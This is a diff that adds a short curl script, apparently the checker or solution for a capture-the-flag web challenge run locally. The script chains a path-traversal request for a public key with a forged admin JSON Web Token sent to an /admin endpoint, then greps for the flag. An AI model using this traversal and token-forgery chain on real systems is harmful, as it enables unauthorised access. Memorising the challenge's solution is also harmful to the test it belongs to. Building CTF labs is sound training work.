@@ -1,0 +1,3 @@
+curl -s --head --fail --resolve 'githubosint.webctf.it:80:172.17.0.1' --resolve 'githubosint.webctf.it:443:172.17.0.1' https://githubosint.webctf.it/image?image=../pubkey.pem && \
+curl -s --head --fail --resolve 'githubosint.webctf.it:80:172.17.0.1' --resolve 'githubosint.webctf.it:443:172.17.0.1' https://githubosint.webctf.it/guest && \
+curl -s --fail --resolve 'githubosint.webctf.it:80:172.17.0.1' --resolve 'githubosint.webctf.it:443:172.17.0.1' https://githubosint.webctf.it/admin -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiR3Vlc3QiLCJhZG1pbiI6IjEiLCJpYXQiOjE1NzYwMjA4OTB9.khdAWuQkyyA6buO-vBjQWaHJx95zbF6azXlf-ZNek4I" | grep -q "$FLAG"
